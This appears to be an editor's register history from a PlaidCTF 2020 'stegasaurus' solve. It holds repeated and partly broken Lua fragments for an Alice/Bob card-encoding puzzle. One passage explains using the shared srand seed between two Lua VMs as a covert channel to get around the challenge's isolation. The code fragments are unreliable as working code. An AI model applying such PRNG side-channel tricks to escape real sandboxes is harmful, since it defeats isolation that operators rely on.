	    for idx = 1, #candidate_cards do
	        tmp = tmp .. candidate_cards[idx] .. ","
	    end
	    print(tmp)
6800453337ef709454deeb4d422dd709|file:///home/neo/CTFs/plaid2020/stegasaurus/solve.lua|217|26|V|lua
	        print(candidate_cards[idx_cand])
	        print(final_choice)
3ff4d014cca40294fe3731aeb9f96c35|file:///home/neo/CTFs/plaid2020/stegasaurus/solve.lua|209|5|V|lua
	    
	    -- tmp = ""
	    -- for idx = 1, #candidate_cards do
	    --     tmp = tmp .. candidate_cards[idx] .. ","
	    -- end
	    -- print(tmp)
216b7769e49a7b2b1f2befd8bf49b37a|file:///home/neo/CTFs/plaid2020/stegasaurus/solve.lua|281|1|V|lua
	test_hand = {[1] = 29505, [2] = 1389, [3] = 34274, [4] = 40285, [5] = 8434, [6] = 5097, [7] = 9376, [8] = 27915}
	tmp = ""
	for idx =1,#test_hand do
	    tmp = tmp .. test_hand[idx] .. ","
	end
	print(tmp)
1811e29dfa44820cfff2b8956136d2a0|file:///home/neo/CTFs/plaid2020/stegasaurus/solve.lua|282|1|V|lua
	tmp = ""
	for idx =1,#test_hand do
	    tmp = tmp .. test_hand[idx] .. ","
	end
	print(tmp)
a928551b9967503cf537e6b5088f79b7|file:///home/neo/CTFs/plaid2020/stegasaurus/solve.lua|141|1|V|lua
	function combinations(arr)
	    ret_array = {}
	    for i = 1, #arr do
	        local temp = {}
	        for j = 1, #arr do
	            if i ~= j then
	                table.insert(temp, arr[j]) 
	            end
	        end
	        table.insert(ret_array, temp)
	    end
	    return(ret_array)
	end
36bbf611aa31a0656b5716e0c7f21813|file:///home/neo/CTFs/plaid2020/stegasaurus/solve.lua|1|1|V|lua
	
	Alice2 = function(values)
	    positions = {}
	    local max_num = 96
	    for i = 1, max_num do
	        if( values[i] == 2 ) then
	            pos = i - 1 % max_num
	            if pos == -1 then
	                pos = max_num
	            end
	            while( values[pos] ~= 1 ) do
	                pos = pos - 1
	                if pos == -1 then
	                    pos = max_num
	                end
	            end
	            values[pos] = 0
	            table.insert(positions, pos) 
	        end
	    end
	    return(positions)
	end
	
	Bob2 = function(values)
	    positions = {}
	    local max_num = 96
	    for i = 1, max_num do
	        if( values[i] == 0 ) then
	            pos = i + 1 
	            if (pos == max_num + 1) then
	                pos = 1
	            end
	            while( values[pos] ~= 1 ) do
	                pos = pos + 1
	                if (pos == max_num + 1) then
	                    pos = 1
	                end
	            end
	            values[pos] = 2
	            table.insert(positions, pos) 
	        end
	    end
	    return(positions)
	end
	
	left_to_right = 1
	right_to_left = 0
	
	function search_arr(a, n, mobile)
	    for i = 0, n-1 do
	        if (a[i] == mobile) then
	            return(i+1)
	        end
	    end
	end
	
	function get_mobile(a, dir, n)
	    mobile_prev = 0
	    mobile = 0
	    for i = 0, n-1 do
	
	        if(dir[a[i] - 1] == right_to_left and i ~= 0) then
	            if(a[i] > a[i-1] and a[i] > mobile_prev) then
	                mobile = a[i]
	                mobile_prev = mobile
	            end
	        end
	
	        if(dir[a[i]-1] == left_to_right and i ~= n-1) then
	            if(a[i] > a[i+1] and a[i] > mobile_prev) then
	                mobile = a[i]
	                mobile_prev = mobile
	            end
	        end
	
	    end
	    if (mobile == 0 and mobile_prev == 0) then
	        return(0)
	    else
	        return(mobile)
	    end
	
	end
	
	function do_one_perm(a, dir, n)
	    mobile = get_mobile(a, dir, n)
	    pos = search_arr(a, n, mobile)
	
	    if (dir[a[pos - 1] - 1] == right_to_left) then
	        a[pos - 1], a[pos - 2] = a[pos - 2], a[pos - 1]
	    elseif(dir[a[pos - 1] - 1] == left_to_right) then
	        a[pos], a[pos - 1] = a[pos - 1], a[pos]
	    end
	
	    for i = 0, n-1 do
	        if (a[i] > mobile) then
	            if (dir[a[i] - 1] == left_to_right) then
	                dir[a[i] - 1] = right_to_left
	            elseif (dir[a[i] - 1] == right_to_left) then
	                dir[a[i] - 1] = left_to_right
	            end
	        end
	    end
	
	    num_str = ""
	    num = {}
	    for i =0, n-1 do
	        num_str = num_str .. a[i]
	        num[i] = a[i]
	    end
	    val2perm[count] = num
	    perm2val[num_str] = count
	    count = count + 1
	end
	
	function permutations(n)
	    a = {}
	    dir = {}
	
	    num = {}
	    num_str = ""
	    for i = 0, n-1 do
	        a[i] = i+1
	        num[i] = i+1
	        num_str = num_str .. a[i]
	    end
	    val2perm[count] = num
	    perm2val[num_str] = count
	    count = count + 1
	
	    for i = 0, n-1 do
	        dir[i] = right_to_left
	    end
	
	    for i = 1, 5040 - 1 do
	        do_one_perm(a, dir, n)
	    end
	
	end
	
	function card_in_set(card, set)
	    for idx = 1, #set do
	        if set[idx] == card then
	            return(1)
	        end
	    end
	    return(0)
	end
	
	function copy_table(tab)
	    copied = {}
	    for idx = 1, #tab do
	        copied[idx] = tab[idx]
	    end
	    return(copied)
	end
	
	Alice1 = function(hand)
	    table.sort(hand)
	    sum = 0
	    for idx = 1, #hand do
	        sum = sum + hand[idx]
	    end
	    sum = sum % hand_size
	    final_choice = hand[sum + 1]
	
	    revealed = {}
	    for idx = 1, #hand do
	        if hand[idx] ~= final_choice then
	            table.insert(revealed, hand[idx])
	        end
	    end
	
	    new_sum = 0
	    for idx = 1, #revealed do
	        new_sum = new_sum + revealed[idx]
	    end
	    hidden_mod = -new_sum % hand_size
	
	    hidden_subset = {}
	    for c = 0, total_cards - 1 do
	        if card_in_set(c, revealed) == 0 then
	            table.insert(hidden_subset, c)
	        end
	    end
	    
	    candidate_cards = {}
	    for idx_hidden = 1, #hidden_subset do
	        c = hidden_subset[idx_hidden]
	        idx = idx_hidden - 1
	        if idx % hand_size == hidden_mod then
	            table.insert(candidate_cards, c)
	        end
	    end
	
	    for idx_cand = 1, #candidate_cards do
	        if candidate_cards[idx_cand] == final_choice then
	            encoding = val2perm[idx_cand]
	            break
	        end
	    end
	
	    sorted_comb = copy_table(revealed)
	    table.sort(sorted_comb)
	    cards_to_return = {}
	    tmp_str = ""
	    for idx_enc = 0, #encoding do
	        tmp_str = tmp_str .. encoding[idx_enc] 
	        pos = encoding[idx_enc]
	        table.insert(cards_to_return, sorted_comb[pos])
	    end
	    return(cards_to_return)
	end
	
	function index_of(item, tab)
	    for idx = 1, #tab do
	        if tab[idx] == item then
	            return(idx)
	        end
	    end
	    return -1
	end
	
	Bob1 = function(revealed)
	    new_sum = 0
	    for idx = 1, #revealed do
	        new_sum = new_sum + revealed[idx]
	    end
	    hidden_mod = -new_sum % hand_size
	
	    hidden_subset = {}
	    for c = 0, total_cards - 1 do
	        if card_in_set(c, revealed) == 0 then
	            table.insert(hidden_subset, c)
	        end
	    end
	    
	    candidate_cards = {}
	    for idx_hidden = 1, #hidden_subset do
	        c = hidden_subset[idx_hidden]
	        idx = idx_hidden - 1
	        if idx % hand_size == hidden_mod then
	            table.insert(candidate_cards, c)
	        end
	    end
	
	    sorted_hand = copy_table(revealed)
	    table.sort(sorted_hand)
	    encoding = ""
	    for idx_card = 1, #revealed do
	        card = revealed[idx_card]
	        index = index_of(card, sorted_hand)
	        encoding = encoding .. index
	    end
	    real_pos = perm2val[encoding]
	    guess = candidate_cards[real_pos]
	    return(guess)
	end
	
	hand_size = 8
	total_cards = 40320 + (hand_size - 1)
	total_canditates = 5040
	val2perm = {}
	perm2val = {}
	count = 1
	permutations(hand_size - 1)
	
a69aaeac86e143b37e67716dec88f3bb|file:///home/neo/CTFs/plaid2020/stegasaurus/solve.lua|1|1|V|lua
	local si
0298c4ad76b8d2dd968d11183d3040ab|file:///home/neo/CTFs/plaid2020/stegasaurus/solve.lua|271|3|V|lua
	  os.exit(128 + signum)
a1209dc6307432637965baff9463780c|file:///home/neo/CTFs/plaid2020/stegasaurus/solve.lua|270|1|V|lua
	  -- put code to save some stuff here
db84df451066a612db28e6d93a07af17|file:///home/neo/CTFs/plaid2020/stegasaurus/solve.lua|269|2|V|lua
	  io.write("\n")
a73269cd2ff420f45b8b470e5ad43868|file:///home/neo/CTFs/plaid2020/stegasaurus/stegasaurus.c|182|18|v|c
	part 1... ");
6e1163c539091c65af37184186cf0f8d|file:///home/neo/CTFs/plaid2020/stegasaurus/stegasaurus.c|182|1|V|c
		printf("running part 1... ");
		for (int i = 0; i < trials; i++) {
	        printf("%d\n", i);
			if (!part1_checkonce()) return false;
		}
5397693403ceaa846683c62d3913287f|file:///home/neo/CTFs/plaid2020/stegasaurus/solve.lua|205|5|V|lua
	    tmp_str = ""
7d47d29ee29538b010c5a8a865fd336f|file:///home/neo/CTFs/plaid2020/stegasaurus/solve.lua|206|5|V|lua
	        tmp_str = tmp_str .. encoding[idx_enc] 
2c27f767b4cf0ed9d137f38e20fbde97|file:///home/neo/CTFs/plaid2020/stegasaurus/solve.lua|265|9|V|lua
	-- local signal = require("posix.signal")
	-- signal.signal(signal.SIGALRM, function(signum)
	-- end)
b4c0d61a55099e8c60430c4b421921f0|file:///home/neo/CTFs/plaid2020/stegasaurus/solve.lua|229|1|V|lua
	    for c = 0, total_cards - 1 do
	        if card_in_set(c, revealed) == 0 then
	            table.insert(hidden_subset, c)
	        end
	    end
b7e20ea267e0d58c724ed49b9a21f29a|file:///home/neo/CTFs/plaid2020/stegasaurus/solve.lua|266|5|V|lua
	    if card_in_set(c, revealed) == 0 then
481844bc36f9894dd8f9394c349b4c5b|file:///home/neo/CTFs/plaid2020/stegasaurus/solve.lua|179|5|V|lua
	    hidden_subset = {}
c82fea3037193c0ed785f70917bc60d2|file:///home/neo/CTFs/plaid2020/stegasaurus/solve.lua|179|1|V|lua
	
	    for c = 0, total_cards - 1 do
	        if card_in_set(c, revealed) == 0 then
	            table.insert(hidden_subset, c)
	        end
c2a2878d44faf072e69c1ce89c83b44a|file:///home/neo/CTFs/plaid2020/stegasaurus/solve.lua|265|1|v|lua
	-- local signal = require("posix.signal")
466cb268f0ab4c1e47cef79cb21673c1|file:///home/neo/CTFs/plaid2020/stegasaurus/solve.lua|266|1|v|lua
	-- signal.signal(signal.SIGALRM, function(signum)
6b6bc50ce40d049806f16ba54092f93e|file:///home/neo/CTFs/plaid2020/stegasaurus/solve.lua|267|1|v|lua
	-- end)
c00d54d2b0fb48d55e1de3b9e9570d59|file:///home/neo/CTFs/plaid2020/stegasaurus/solve.lua|158|1|V|lua
	    table.sort(hand)
	    sum = 0
	    for idx = 1, #hand do
	        sum = sum + hand[idx]
	    end
	    sum = sum % hand_size
	    final_choice = hand[sum + 1]
	
	    revealed = {}
	    for idx = 1, #hand do
	        if hand[idx] ~= final_choice then
	            table.insert(revealed, hand[idx])
	        end
	    end
	
	    new_sum = 0
	    for idx = 1, #revealed do
	        new_sum = new_sum + revealed[idx]
	    end
	    hidden_mod = -new_sum % hand_size
	
	    hidden_subset = {}
	    for c = 0, total_cards - 1 do
	        if card_in_set(c, revealed) == 0 then
	            table.insert(hidden_subset, c)
	        end
	    end
	    
	    candidate_cards = {}
	    for idx_hidden = 1, #hidden_subset do
	        c = hidden_subset[idx_hidden]
	        idx = idx_hidden - 1
	        if idx % hand_size == hidden_mod then
	            table.insert(candidate_cards, c)
	        end
6c15dc24c9911f9f4d9cd21bfde26b7c|file:///home/neo/CTFs/plaid2020/stegasaurus/solve.lua|158|1|V|lua
	    table.sort(hand)
	    sum = 0
	    for idx = 1, #hand do
	        sum = sum + hand[idx]
	    end
	    sum = sum % hand_size
	    final_choice = hand[sum + 1]
	
	    revealed = {}
	    for idx = 1, #hand do
	        if hand[idx] ~= final_choice then
	            table.insert(revealed, hand[idx])
	        end
	    end
	
	    new_sum = 0
	    for idx = 1, #revealed do
	        new_sum = new_sum + revealed[idx]
	    end
	    hidden_mod = -new_sum % hand_size
	
	    hidden_subset = {}
	    for c = 0, total_cards - 1 do
	        if card_in_set(c, revealed) == 0 then
	            table.insert(hidden_subset, c)
	        end
	    end
	    
	    candidate_cards = {}
	    for idx_hidden = 1, #hidden_subset do
	        c = hidden_subset[idx_hidden]
	        idx = idx_hidden - 1
	        if idx % hand_size == hidden_mod then
	            table.insert(candidate_cards, c)
	        end
	    end
	
	    for idx_cand = 1, #candidate_cards do
	        if candidate_cards[idx_cand] == final_choice then
	            encoding = val2perm[idx_cand]
	            break
	        end
	    end
	
	    sorted_comb = copy_table(revealed)
	    table.sort(sorted_comb)
	    cards_to_return = {}
	    for idx_enc = 0, #encoding do
	        pos = encoding[idx_enc]
	        table.insert(cards_to_return, sorted_comb[pos])
	    end
	    return(cards_to_return)
dea918048e1c9375c2c7a6a077e95470|file:///home/neo/CTFs/plaid2020/stegasaurus/solve.lua|162|1|V|lua
	function index_of(item, tab)
	    for idx = 1, #tab do
	        if tab[idx] == item then
	            return(idx)
	        end
	    end
	    return -1
	end
	
35490bbfb1965870f3eb2bd732d8f5eb|file:///home/neo/CTFs/plaid2020/stegasaurus/solve.lua|163|1|V|lua
	    new_sum = 0
	    for idx = 1, #revealed do
	        new_sum = new_sum + revealed[idx]
	    end
	    hidden_mod = -new_sum % hand_size
	
	    hidden_subset = {}
	    for c = 0, total_cards - 1 do
	        if card_in_set(c, revealed) == 0 then
	            table.insert(hidden_subset, c)
	        end
	    end
	    
	    candidate_cards = {}
	    for idx_hidden = 1, #hidden_subset do
	        c = hidden_subset[idx_hidden]
	        idx = idx_hidden - 1
	        if idx % hand_size == hidden_mod then
	            table.insert(candidate_cards, c)
	        end
	    end
	
	    sorted_hand = copy_table(revealed)
	    table.sort(sorted_hand)
	    encoding = ""
	    for idx_card = 1, #revealed do
	        card = revealed[idx_card]
	        index = index_of(card, sorted_hand)
	        encoding = encoding .. index
	    end
	    real_pos = perm2val[encoding]
	    guess = candidate_cards[real_pos]
	    return(guess)
60d764ba427e16de1c8a18852c7c1d7c|file:///home/neo/CTFs/plaid2020/stegasaurus/solve.lua|176|1|V|lua
	choice = 0
1dee5734d7e100ee991b49ed4c1581cd|file:///home/neo/CTFs/plaid2020/stegasaurus/solve.lua|158|1|V|lua
	    choice = hand[1]
f6d19434f4f77f09dc3a7795fc0518d0|file:///home/neo/CTFs/plaid2020/stegasaurus/solve.lua|166|2|V|lua
	    return(choice)
2b139b1a918149b17b439f124c73486b|file:///home/neo/CTFs/plaid2020/stegasaurus/solve.lua|187|1|V|lua
	returned = Alice1(test_hand)
	guess = Bob1(returned)
	print(guess)
ca4c470f17eddaa97352d4a09c67d228|file:///home/neo/CTFs/plaid2020/stegasaurus/solve.lua|159|5|V|lua
	    table.remove(hand, 1)
b26f37c6d787109ab34e194248d70473|file:///home/neo/CTFs/plaid2020/stegasaurus/solve.lua|188|1|V|lua
	--     returned = Alice1(test_hand)
	--     guess = Bob1(returned)
	--     print(guess)
2ff1e05b07c5982517ec2c7f03809272|file:///home/neo/CTFs/plaid2020/stegasaurus/solve.lua|257|1|V|lua
	hand_size = 8
	total_cards = 40320 + (hand_size - 1)
	total_canditates = 5040
	val2perm = {}
	perm2val = {}
	count = 1
	permutations(hand_size - 1)
ed03ff858154fae0adb407445c08b561|file:///home/neo/CTFs/plaid2020/stegasaurus/solve.lua|179|1|V|lua
	    hidden_subset = {}
	    for c = 0, total_cards - 1 do
	        if card_in_set(c, revealed) == 0 then
	            table.insert(hidden_subset, c)
	        end
	    end
	    
3b6f57374ac236ddd59a62d108cf995d|file:///home/neo/CTFs/plaid2020/stegasaurus/solve.lua|197|9|V|lua
	        tmp = ""
8e96cdb3763dc389b7f7ca7f9d66e765|file:///home/neo/CTFs/plaid2020/stegasaurus/solve.lua|197|18|v|lua
	total_canditates
4a05ef76b7f4f7608a0fb067a8a42189|file:///home/neo/CTFs/plaid2020/stegasaurus/solve.lua|201|5|V|lua
	    print(#candidate_cards)
78347b5068d95db96b04a0e776eb1da9|file:///home/neo/CTFs/plaid2020/stegasaurus/solve.lua|247|9|V|lua
	        idx = idx_hidden - 1
a348bf2a4d1d079090206d975fff9b46|file:///home/neo/CTFs/plaid2020/stegasaurus/solve.lua|191|9|V|lua
	        -- idx = idx_hidden - 1
61b1072214477abe75c935e8d8e1a0cf|file:///home/neo/CTFs/plaid2020/stegasaurus/solve.lua|181|1|V|lua
	    -- hidden_subset = {}
	    -- for c = 0, total_cards - 1 do
	    --     if card_in_set(c, revealed) == 0 then
	    --         table.insert(hidden_subset, c)
	    --     end
	    -- end
2dbc93fe3e7eeb0715178fecccbb23d7|file:///home/neo/CTFs/plaid2020/stegasaurus/solve.lua|193|4|v|lua
	 print(tmp)
b4d24a303670b5b6739cff57cf31996d|file:///home/neo/CTFs/plaid2020/stegasaurus/solve.lua|188|4|V|lua
	    
	    tmp = ""
	    for idx = 1, #candidate_cards do
	        tmp = tmp .. candidate_cards[idx] .. ","
	    end
	    print(tmp)
811583f81b4565222188f81e81c86b05|file:///home/neo/CTFs/plaid2020/stegasaurus/solve.lua|188|5|V|lua
	    -- print(final_choice)
9563aa53747b910c72e471e7f2d2cd1b|file:///home/neo/CTFs/plaid2020/stegasaurus/solve.lua|238|1|V|lua
	    -- tmp = ""
	    -- for idx = 1, #candidate_cards do
	    --     tmp = tmp .. candidate_cards[idx] .. ","
	    -- end
	    -- print(tmp)
2b2010880326277b301da0dc96e972ec|file:///home/neo/CTFs/plaid2020/stegasaurus/solve.lua|174|1|V|lua
	    for idx = 1, #revealed do
	        new_sum = new_sum + revealed[idx]
	        table.remove(hidden_subset, revealed[idx])
	    end
0f6969d7052da9261e31ddb6e88c136e|file:///home/neo/CTFs/plaid2020/stegasaurus/solve.lua|205|15|v|lua
	remove
4060204a1d2b009a38f8056dc380749f|file:///home/neo/CTFs/plaid2020/stegasaurus/solve.lua|204|9|V|lua
	        new_sum = new_sum + revealed[idx]
df5990d0df5e782b9678bc5a32322777|file:///home/neo/CTFs/plaid2020/stegasaurus/solve.lua|206|13|V|lua
	    tmp = ""
	    for idx = 1, #hidden_subset do
	        if hidden_subset[idx] ~= idx 
	        tmp = tmp .. hidden_subset[idx] .. ","
	    end
9246b14add14d951ac30f67483b6cb0a|file:///home/neo/CTFs/plaid2020/stegasaurus/solve.lua|204|9|V|lua
	        table.insert(hidden_subset, revealed[idx], revealed[idx])
13924aa4d40e4b564cd21923272355e3|file:///home/neo/CTFs/plaid2020/stegasaurus/solve.lua|262|1|V|lua
	    hidden_subset[idx] = idx
dc2dc9d68588869932127a9226dadca8|file:///home/neo/CTFs/plaid2020/stegasaurus/solve.lua|261|1|V|lua
	for idx = 1, total_cards do
	    hidden_subset[idx] = idx
	end
caa21c5d6a91bbc5a6e585ee3c0153e4|file:///home/neo/CTFs/plaid2020/stegasaurus/solve.lua|203|5|V|lua
	    for idx = 1, total_cards do
6fb24368c2a6ede2c692e9267c9767e9|file:///home/neo/CTFs/plaid2020/stegasaurus/solve.lua|234|1|V|lua
	    -- hidden_subset = {}
	    -- for c = 0, total_cards - 1 do
	    --     if card_in_set(c, revealed) == 0 then
	    --         table.insert(hidden_subset, c)
	    --     end
	    -- end
	    
62db0a8c6729d80ed6f9ed8a4ddd44ab|file:///home/neo/CTFs/plaid2020/stegasaurus/solve.lua|207|5|V|lua
	    tmp = ""
	    for idx = 1, #hidden_subset do
	        if hidden_subset[idx] ~= idx then
	            print(idx)
	        end
	        tmp = tmp .. hidden_subset[idx] .. ","
	    end
5b4943c69a5ddd62f23f83dd07f0cf58|file:///home/neo/CTFs/plaid2020/stegasaurus/solve.lua|205|1|V|lua
	        table.insert(hidden_subset, revealed[idx] + idx - 1, revealed[idx] + idx - 1)
e94c61ef65dd84c5cc56c3acf366797d|file:///home/neo/CTFs/plaid2020/stegasaurus/solve.lua|204|1|V|lua
	    for idx = 1, #revealed do
	        table.insert(hidden_subset, revealed[idx] + idx - 1, revealed[idx] + idx - 1)
	    end
5b036e3ebfbd7582e343ffbba06b470b|file:///home/neo/CTFs/plaid2020/stegasaurus/solve.lua|265|3|V|lua
	returned = Alice1(test_hand)
	guess = Bob1(returned)
9f4b2363f7e73f2db94e7f847edebd2c|file:///home/neo/CTFs/plaid2020/stegasaurus/solve.lua|176|28|V|lua
	        print(revealed[idx])
	        print(hidden_subset[revealed[idx] - idx + 1])
41f5f83794a95f53ea3fc4c555cc926f|file:///home/neo/CTFs/plaid2020/stegasaurus/solve.lua|207|1|V|lua
	    for idx = 0, #hidden_subset do
	        if hidden_subset[idx] ~= idx then
	            print(idx)
	        end
	    end
0397036c561bd9ca21f50b19abf2ce7f|file:///home/neo/CTFs/plaid2020/stegasaurus/solve.lua|213|9|V|lua
	        print(tmp)
1823aab34c56bcb7a63894c992589c47|file:///home/neo/CTFs/plaid2020/stegasaurus/solve.lua|211|10|V|lua
	            tmp = tmp .. hidden_subset[idx] .. ","
dde8dd680c7369a0319d542884865e0e|file:///home/neo/CTFs/plaid2020/stegasaurus/stegasaurus.c|47|1|V|c
		for (int i = 0; i < hand_size; i++) {
			unsigned int card;
			fread(&card, sizeof(unsigned int), 1, urand);
			card %= deck_size - i;
			card += i;
			hand[i] = deck[card];
			// Swap cards in deck so no reuse
			deck[card] = deck[i];
			deck[i] = hand[i];
		}
9af2be3498631467a027fd5d0176f703|file:///home/neo/CTFs/plaid2020/stegasaurus/stegasaurus.c|59|1|V|c
			unsigned int card;
			fread(&card, sizeof(unsigned int), 1, urand);
			card %= deck_size - i;
			card += i;
			hand[i] = deck[card];
			// Swap cards in deck so no reuse
			deck[card] = deck[i];
			deck[i] = hand[i];
47d27a83c02d28c208d36255e50e49d9|file:///home/neo/CTFs/plaid2020/stegasaurus/solve.lua|275|1|V|lua
	-- test_hand = {[1] = 29505, [2] = 1389, [3] = 34274, [4] = 40285, [5] = 8434, [6] = 5097, [7] = 9376, [8] = 27915}
8f63b73373003ffea6758a58b79a010f|file:///home/neo/CTFs/plaid2020/stegasaurus/solve.lua|277|1|v|lua
	26214
1a79e60cce2641f20b34acb72cd287d7|file:///home/neo/CTFs/plaid2020/stegasaurus/solve.lua|276|26|v|lua
	29505
acfb944f17391575205a32619e3f9d37|file:///home/neo/CTFs/plaid2020/stegasaurus/solve.lua|276|47|v|lua
	34274
737db06851aa4224553a728773b50123|file:///home/neo/CTFs/plaid2020/stegasaurus/solve.lua|276|60|v|lua
	40285
1906f3350e1fa43adced642ff351c943|file:///home/neo/CTFs/plaid2020/stegasaurus/solve.lua|276|73|v|lua
	8434
5a9542c773018268fc6271f7afeea969|file:///home/neo/CTFs/plaid2020/stegasaurus/solve.lua|276|86|v|lua
	5097
15d496c747570c7e50bdcd422bee5576|file:///home/neo/CTFs/plaid2020/stegasaurus/solve.lua|276|99|v|lua
	9376
50e8d294d7bce40086885257076ede3f|file:///home/neo/CTFs/plaid2020/stegasaurus/solve.lua|276|112|v|lua
	27915
4f4370710d40be1d430cc2efebdb28a5|file:///home/neo/CTFs/plaid2020/stegasaurus/solve.lua|277|1|V|lua
	, 12857, 36404, 21029, 34618, 17703, 24165, 24166,
3b0297d5f6b35c9ce9075e5873628a72|file:///home/neo/CTFs/plaid2020/stegasaurus/solve.lua|279|1|v|lua
	39392
73d4d7b15bfefa13c4a035fa16bb99ed|file:///home/neo/CTFs/plaid2020/stegasaurus/solve.lua|278|34|v|lua
	12847
e4df76144e798cb0077f3ce85d0a4e3e|file:///home/neo/CTFs/plaid2020/stegasaurus/solve.lua|278|47|v|lua
	36404
366971226c73b87ab69e87918b9338a5|file:///home/neo/CTFs/plaid2020/stegasaurus/solve.lua|278|60|v|lua
	21029
b2c6dec66eada0847015737371ffa928|file:///home/neo/CTFs/plaid2020/stegasaurus/solve.lua|278|73|v|lua
	34618
5edbb88e4a0768a67fc6804f9d2b7944|file:///home/neo/CTFs/plaid2020/stegasaurus/solve.lua|278|86|v|lua
	17703
2bd0503ff12d7a8e6873ba059ea0a2c3|file:///home/neo/CTFs/plaid2020/stegasaurus/solve.lua|278|98|v|lua
	24165
d15fa69abab357f1ff01e3bb5f38e88b|file:///home/neo/CTFs/plaid2020/stegasaurus/solve.lua|278|111|v|lua
	24166
b76b3a4adcf78c64b7d9a4db6b739df8|file:///home/neo/CTFs/plaid2020/stegasaurus/solve.lua|279|1|V|lua
	, 28067, 26181, 16673, 31713, 7060, 26093, 31715,
6fcc52395de6b08ef84dc2c14ea56610|file:///home/neo/CTFs/plaid2020/stegasaurus/solve.lua|278|1|V|lua
	test_hand = {[1] = 39392,  [2] = 28067, [3] = 26181, [4] = 16673, [5] = 31713, [6] = 7060, [7] = 26093, [8] = 31715}
5cf6eb5628e4ec03262702901a9b292f|file:///home/neo/CTFs/plaid2020/stegasaurus/solve.lua|195|1|V|lua
	    for i = 1, #candidate_cards do
	        tmp = tmp .. candidate_cards[i] .. ","
	    end
	    print(tmp)
d671ffa6d281d3726f78d4c319d6be74|file:///home/neo/CTFs/plaid2020/stegasaurus/solve.lua|183|17|v|lua
	candidate_cards
b72acc9411f66351a9ad00315a262a11|file:///home/neo/CTFs/plaid2020/stegasaurus/solve.lua|293|5|V|lua
	    print(guess)
9f5ac8b9dbf7413bde18d59a268b6965|file:///home/neo/CTFs/plaid2020/stegasaurus/solve.lua|187|5|V|lua
	    print(tmp)
6a2fa5941534b0aa27a926bc2898b47c|file:///home/neo/CTFs/plaid2020/stegasaurus/solve.lua|183|1|V|lua
	    tmp = ""
	    for i = 1, #sorted_comb do
	        tmp = tmp .. sorted_comb[i] .. ","
	    end
0071d34104d9f9c7dfbc44f233672ae3|file:///home/neo/CTFs/plaid2020/stegasaurus/solve.lua|188|13|V|lua
	            print(sorted_comb[nil_idx + 1])
e8ce550b52bbcccd6cfaf9432fd4bbc8|file:///home/neo/CTFs/plaid2020/stegasaurus/solve.lua|193|8|V|lua
	    tmp = ""
	    for i = 1, #candidate_cards do
	        tmp = tmp .. candidate_cards[i] .. ","
	    end
	    -- print(tmp)
	    print(final_choice)
7000ff151214395c6a8cb5e04ed8ea49|file:///home/neo/CTFs/plaid2020/stegasaurus/solve.lua|205|9|V|lua
	        -- print(sorted_comb[pos])
470ca626b6ed61562db0013354105950|file:///home/neo/CTFs/plaid2020/stegasaurus/real_sol.lua|3|1|V|lua
	if print == nil then
	    print = function(...) end
	end
	
646cd7eb357347c6294ad9a1ea397951|file:///home/neo/CTFs/plaid2020/stegasaurus/real_sol.lua|5|5|V|lua
	    print("Hi, I'm Alice, this is check 1 round " .. round1)
b0446cdb4839a2fbfb431be8589b445e|file:///home/neo/CTFs/plaid2020/stegasaurus/real_sol.lua|7|1|V|lua
	    print("card",discarded)
2812e695bb0474559c2ef69bb28ce248|file:///home/neo/CTFs/plaid2020/stegasaurus/real_sol.lua|10|5|V|lua
	    print("perm",permutation)
5b113d5f8097098cf93b117206d3f17d|file:///home/neo/CTFs/plaid2020/stegasaurus/real_sol.lua|17|5|V|lua
	    print("Hi, I'm Bob")
05b46fa537c660e90c9939ffa78c3845|file:///home/neo/CTFs/plaid2020/stegasaurus/real_sol.lua|19|5|v|lua
	print("perm",permutation)
	    -- and choose one of the 8 possibilities at random
	    local randvalue = math.random(0,7)
	    
0479201dd0ceb4fc48f51fa9f7d4672a|file:///home/neo/CTFs/plaid2020/stegasaurus/real_sol.lua|19|5|V|lua
	    print("rand",randvalue)
2148f9c09848a09c109e1562cd3bc036|file:///home/neo/CTFs/plaid2020/stegasaurus/real_sol.lua|23|5|V|lua
	    print("guess",guess)
c52dc8894ab20f246aa2216c78d8e7a8|file:///home/neo/CTFs/plaid2020/stegasaurus/real_sol.lua|25|1|V|lua
	Great. But Bob will get it wrong 7 times in 8. How can we communicate the final 1-in-8 choice reliably?
	
	The secret lies in Lua's math library and its random/randomseed functions. math.randomseed is just a wrapper around the C function srand:
	
	The srand() function sets its argument seed as the seed for a new sequence of pseudo-random numbers to be returned by rand(). These sequences are repeatable by calling srand() with the same seed value.
	
	Since srand() is a C library function, its state is global within a process - that means it's shared between the two Lua VMs! We can use this to communicate a few bits of information from Alice to Bob:
	
d1bce9a7e986d5f6c696f69f1542d60d|file:///home/neo/CTFs/plaid2020/stegasaurus/real_sol.lua|44|5|V|lua
	    print("seed",seed)
652c3f67525135ecf86547565a07f835|file:///home/neo/CTFs/plaid2020/stegasaurus/solve.lua|1|1|V|lua
	Alice2 = function(values)
	    positions = {}
	    local max_num = 96
	    for i = 1, max_num do
	        if( values[i] == 2 ) then
	            pos = i - 1 % max_num
	            if pos == -1 then
	                pos = max_num
	            end
	            while( values[pos] ~= 1 ) do
	                pos = pos - 1
	                if pos == -1 then
	                    pos = max_num
	                end
	            end
	            values[pos] = 0
	            table.insert(positions, pos) 
	        end
	    end
	    return(positions)
	end
	
	Bob2 = function(values)
	    positions = {}
	    local max_num = 96
	    for i = 1, max_num do
	        if( values[i] == 0 ) then
	            pos = i + 1 
	            if (pos == max_num + 1) then
	                pos = 1
	            end
	            while( values[pos] ~= 1 ) do
	                pos = pos + 1
	                if (pos == max_num + 1) then
	                    pos = 1
	                end
	            end
	            values[pos] = 2
	            table.insert(positions, pos) 
	        end
	    end
	    return(positions)
	end
	
9e2df10930de56ea4a9815290659fd26|file:///home/neo/CTFs/plaid2020/stegasaurus/fast_sol.lua|30|5|V|lua
	    print("Hi, I'm Alice, this is check 2 round " .. round2)
313cc9da76cdd54d0c8c446aff68321e|file:///home/neo/CTFs/plaid2020/stegasaurus/fast_sol.lua|58|9|V|lua
	        print("Failed to find an unflipped 1 in first 65 values!")
022b9087645ee2aebfc81c8fb14880cf|file:///home/neo/CTFs/plaid2020/stegasaurus/fast_sol.lua|60|5|V|lua
	    print("i",startindex)
3ebbf8f6b67e0b969e027d5e821b6dd6|file:///home/neo/CTFs/plaid2020/stegasaurus/fast_sol.lua|74|5|V|lua
	    print "Hi, I'm Bob"
7a5f6ce95e011a6149a9642f1370ccb7|file:///home/neo/CTFs/plaid2020/stegasaurus/fast_sol.lua|79|5|V|lua
	    print("i",i)
cc01ddc39ca9b50dc4ec620c2789dc12|file:///home/neo/CTFs/plaid2020/stegasaurus/fast_sol.lua|28|1|V|lua
